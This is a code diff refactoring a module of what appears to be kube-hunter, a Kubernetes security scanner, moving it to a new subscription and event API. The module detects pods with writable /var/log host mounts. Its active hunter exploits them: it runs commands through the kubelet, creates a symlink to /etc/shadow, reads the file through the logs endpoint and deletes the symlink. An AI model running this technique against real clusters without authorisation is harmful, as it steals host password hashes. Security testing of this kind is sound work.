@@ -3,13 +3,13 @@ import re
 import uuid
 
 from kube_hunter.conf import get_config
-from kube_hunter.core.events import handler
-from kube_hunter.core.events.types import Event, Vulnerability
+from kube_hunter.core.pubsub.subscription import subscribe
 from kube_hunter.core.types import (
     ActiveHunter,
     Hunter,
     KubernetesCluster,
     PrivilegeEscalation,
+    Vulnerability,
 )
 from kube_hunter.modules.hunting.kubelet import (
     ExposedPodsHandler,
@@ -20,38 +20,44 @@ from kube_hunter.modules.hunting.kubelet import (
 logger = logging.getLogger(__name__)
 
 
-class WriteMountToVarLog(Vulnerability, Event):
+class WriteMountToVarLog(Vulnerability):
     """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traveral"""
 
-    def __init__(self, pods):
-        Vulnerability.__init__(
-            self, KubernetesCluster, "Pod With Mount To /var/log", category=PrivilegeEscalation, vid="KHV047",
+    pods: str
+
+    def __init__(self, pods: str):
+        super().__init__(
+            name="Pod With Mount To /var/log",
+            component=KubernetesCluster,
+            category=PrivilegeEscalation,
+            vid="KHV047",
+            evidence="pods: {pods}",
         )
         self.pods = pods
-        self.evidence = "pods: {}".format(", ".join((pod["metadata"]["name"] for pod in self.pods)))
 
 
-class DirectoryTraversalWithKubelet(Vulnerability, Event):
+class DirectoryTraversalWithKubelet(Vulnerability):
     """An attacker can run commands on pods with mount to /var/log,
     and traverse read all files on the host filesystem"""
 
-    def __init__(self, output):
-        Vulnerability.__init__(
-            self, KubernetesCluster, "Root Traversal Read On The Kubelet", category=PrivilegeEscalation,
+    output: str
+
+    def __init__(self, output: str):
+        super().__init__(
+            name="Root Traversal Read On The Kubelet",
+            component=KubernetesCluster,
+            category=PrivilegeEscalation,
+            evidence=f"output: {output}",
         )
         self.output = output
-        self.evidence = "output: {}".format(self.output)
 
 
-@handler.subscribe(ExposedPodsHandler)
+@subscribe(ExposedPodsHandler)
 class VarLogMountHunter(Hunter):
     """Mount Hunter - /var/log
     Hunt pods that have write access to host's /var/log. in such case,
     the pod can traverse read files on the host machine
     """
-
-    def __init__(self, event):
-        self.event = event
 
     def has_write_mount_to(self, pod_data, path):
         """Returns volume for correlated writable mount"""
@@ -62,36 +68,39 @@ class VarLogMountHunter(Hunter):
                         return volume
 
     def execute(self):
-        pe_pods = []
+        vulnerable_pods = []
         for pod in self.event.pods:
             if self.has_write_mount_to(pod, path="/var/log"):
-                pe_pods.append(pod)
-        if pe_pods:
-            self.publish_event(WriteMountToVarLog(pods=pe_pods))
+                vulnerable_pods.append(pod["metadata"]["name"])
+        if vulnerable_pods:
+            yield WriteMountToVarLog(pods=vulnerable_pods)
 
 
-@handler.subscribe(ExposedRunHandler)
+@subscribe(ExposedRunHandler)
 class ProveVarLogMount(ActiveHunter):
     """Prove /var/log Mount Hunter
     Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log
     """
 
-    def __init__(self, event):
-        self.event = event
+    def __init__(self, event: ExposedRunHandler):
+        super().__init__(event)
         self.base_path = f"https://{self.event.host}:{self.event.port}"
 
     def run(self, command, container):
+        config = get_config()
         run_url = KubeletHandlers.RUN.value.format(
             podNamespace=container["namespace"], podID=container["pod"], containerName=container["name"], cmd=command,
         )
-        return self.event.session.post(f"{self.base_path}/{run_url}", verify=False).text
+        return self.event.session.post(
+            f"{self.base_path}/{run_url}", verify=False, timeout=config.network_timeout
+        ).content
 
     # TODO: replace with multiple subscription to WriteMountToVarLog as well
     def get_varlog_mounters(self):
         config = get_config()
         logger.debug("accessing /pods manually on ProveVarLogMount")
         pods = self.event.session.get(
-            f"{self.base_path}/" + KubeletHandlers.PODS.value, verify=False, timeout=config.network_timeout,
+            f"{self.base_path}/{KubeletHandlers.PODS.value}", verify=False, timeout=config.network_timeout,
         ).json()["items"]
         for pod in pods:
             volume = VarLogMountHunter(ExposedPodsHandler(pods=pods)).has_write_mount_to(pod, "/var/log")
@@ -110,7 +119,6 @@ class ProveVarLogMount(ActiveHunter):
         """Returns content of file on the host, and cleans trails"""
         config = get_config()
         symlink_name = str(uuid.uuid4())
-        # creating symlink to file
         self.run(f"ln -s {host_file} {mount_path}/{symlink_name}", container)
         # following symlink with kubelet
         path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(
@@ -118,8 +126,7 @@ class ProveVarLogMount(ActiveHunter):
         )
         content = self.event.session.get(
             f"{self.base_path}/{path_in_logs_endpoint}", verify=False, timeout=config.network_timeout,
-        ).text
-        # removing symlink
+        ).content
         self.run(f"rm {mount_path}/{symlink_name}", container=container)
         return content
 
@@ -136,6 +143,6 @@ class ProveVarLogMount(ActiveHunter):
                     output = self.traverse_read(
                         "/etc/shadow", container=cont, mount_path=mount_path, host_path=volume["hostPath"]["path"],
                     )
-                    self.publish_event(DirectoryTraversalWithKubelet(output=output))
+                    yield DirectoryTraversalWithKubelet(output=output)
                 except Exception:
                     logger.debug("Could not exploit /var/log", exc_info=True)
